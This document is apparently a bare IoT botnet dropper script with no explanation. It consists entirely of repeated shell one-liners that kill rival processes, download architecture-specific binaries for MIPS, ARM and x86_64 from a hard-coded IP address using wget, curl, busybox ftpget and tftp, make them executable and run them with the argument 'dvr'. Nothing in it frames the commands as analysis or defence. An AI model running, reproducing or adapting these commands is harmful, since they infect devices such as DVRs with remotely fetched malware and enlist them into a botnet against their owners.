  
killall -9 mips; killall -9 mips.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/z/89/mips; chmod +x mips; ./mips dvr
killall -9 mpsl; killall -9 mpsl.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/z/89/mpsl; chmod +x mpsl; ./mpsl dvr
killall -9 x86_64; killall -9 x86_64.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/z/89/x86_64; chmod +x x86_64; ./x86_64 dvr
killall -9 arm4; killall -9 arm4.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/z/89/arm4; chmod +x arm4; ./arm4 dvr
killall -9 arm5; killall -9 arm5.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/z/89/arm5; chmod +x arm5; ./arm5 dvr
killall -9 arm6; killall -9 arm6.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/z/89/arm6; chmod +x arm6; ./arm6 dvr
killall -9 arm7; killall -9 arm7.s; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.16.52.10/z/89/arm7; chmod +x arm7; ./arm7 dvr

cd /tmp; rm -rf *;
/bin/busybox ftpget/178.16.52.10/z/89 -P 8021 mips mips; chmod 777 mips; ./mips dvr
/bin/busybox ftpget/178.16.52.10/z/89 -P 8021 mpsl mpsl; chmod 777 mpsl; ./mips dvr
/bin/busybox ftpget/178.16.52.10/z/89 -P 8021 x86_64 x86_64; chmod 777 x86_64; ./x86_64 dvr
/bin/busybox ftpget/178.16.52.10/z/89 -P 8021 arm4 arm4; chmod 777 arm4; ./arm4 dvr
/bin/busybox ftpget/178.16.52.10/z/89 -P 8021 arm5 arm5; chmod 777 arm5; ./arm5 dvr
/bin/busybox ftpget/178.16.52.10/z/89 -P 8021 arm5 arm6; chmod 777 arm6; ./arm6 dvr
/bin/busybox ftpget/178.16.52.10/z/89 -P 8021 arm7 arm7; chmod 777 arm7; ./arm7 dvr

killall -9 mips; killall -9 mips.s;  wget http://178.16.52.10/z/89/mips; chmod +x mips; ./mips dvr
killall -9 mpsl; killall -9 mpsl.s;  wget http://178.16.52.10/z/89/mpsl; chmod +x mpsl; ./mpsl dvr
killall -9 x86_64; killall -9 x86_64.s;  wget http://178.16.52.10/z/89/x86_64; chmod +x x86_64; ./x86_64 dvr
killall -9 arm4; killall -9 arm4.s;  wget http://178.16.52.10/z/89/arm4; chmod +x arm4; ./arm4 dvr
killall -9 arm5; killall -9 arm5.s;  wget http://178.16.52.10/z/89/arm5; chmod +x arm5; ./arm5 dvr
killall -9 arm6; killall -9 arm6.s;  wget http://178.16.52.10/z/89/arm6; chmod +x arm6; ./arm6 dvr
killall -9 arm7; killall -9 arm7.s;  wget http://178.16.52.10/z/89/arm7; chmod +x arm7; ./arm7 dvr

killall -9 mips; killall -9 mips.s;  curl -O http://178.16.52.10/z/89/mips; chmod +x mips; ./mips dvr
killall -9 mpsl; killall -9 mpsl.s;  curl -O http://178.16.52.10/z/89/mpsl; chmod +x mpsl; ./mpsl dvr
killall -9 x86_64; killall -9 x86_64.s;  curl -O http://178.16.52.10/z/89/x86_64; chmod +x x86_64; ./x86_64 dvr
killall -9 arm4; killall -9 arm4.s;  curl -O http://178.16.52.10/z/89/arm4; chmod +x arm4; ./arm4 dvr
killall -9 arm5; killall -9 arm5.s;  curl -O http://178.16.52.10/z/89/arm5; chmod +x arm5; ./arm5 dvr
killall -9 arm6; killall -9 arm6.s;  curl -O http://178.16.52.10/z/89/arm6; chmod +x arm6; ./arm6 dvr
killall -9 arm7; killall -9 arm7.s;  curl -O http://178.16.52.10/z/89/arm7; chmod +x arm7; ./arm7 dvr

ftpget/178.16.52.10/z/89 -P 8021 mips mips; chmod 777 mips; ./mips dvr
ftpget/178.16.52.10/z/89 -P 8021 mpsl mpsl; chmod 777 mpsl; ./mpsl dvr
ftpget/178.16.52.10/z/89 -P 8021 x86_64 x86_64; chmod 777 x86_64; ./x86_64 dvr
ftpget/178.16.52.10/z/89 -P 8021 arm4 arm4; chmod 777 arm4; ./arm4 dvr
ftpget/178.16.52.10/z/89 -P 8021 arm5 arm5; chmod 777 arm5; ./arm5 dvr
ftpget/178.16.52.10/z/89 -P 8021 arm6 arm6; chmod 777 arm6; ./arm6 dvr
ftpget/178.16.52.10/z/89 -P 8021 arm7 arm7; chmod 777 arm7; ./arm7 dvr

/bin/busybox tftp -g -r mips/178.16.52.10/z/89 69; chmod 777 mips; ./mips dvr
/bin/busybox tftp -g -r mpsl/178.16.52.10/z/89 69; chmod 777 mpsl; ./mpsl dvr
/bin/busybox tftp -g -r x86_64/178.16.52.10/z/89 69; chmod 777 x86_64; ./x86_64 dvr
/bin/busybox tftp -g -r arm4/178.16.52.10/z/89 69; chmod 777 arm4; ./arm4 dvr
/bin/busybox tftp -g -r arm5/178.16.52.10/z/89 69; chmod 777 arm5; ./arm5 dvr
/bin/busybox tftp -g -r arm6/178.16.52.10/z/89 69; chmod 777 arm6; ./arm6 dvr
/bin/busybox tftp -g -r arm7/178.16.52.10/z/89 69; chmod 777 arm7; ./arm7 dvr

tftp -g -r mips/178.16.52.10/z/89 69; chmod 777 mips; ./mips dvr
tftp -g -r mpsl/178.16.52.10/z/89 69; chmod 777 mpsl; ./mpsl dvr
tftp -g -r x86_64/178.16.52.10/z/89 69; chmod 777 x86_64; ./x86_64 dvr
tftp -g -r arm4/178.16.52.10/z/89 69; chmod 777 arm4; ./arm4 dvr
tftp -g -r arm5/178.16.52.10/z/89 69; chmod 777 arm5; ./arm5 dvr
tftp -g -r arm6/178.16.52.10/z/89 69; chmod 777 arm6; ./arm6 dvr
tftp -g -r arm7/178.16.52.10/z/89 69; chmod 777 arm7; ./arm7 dvr

        
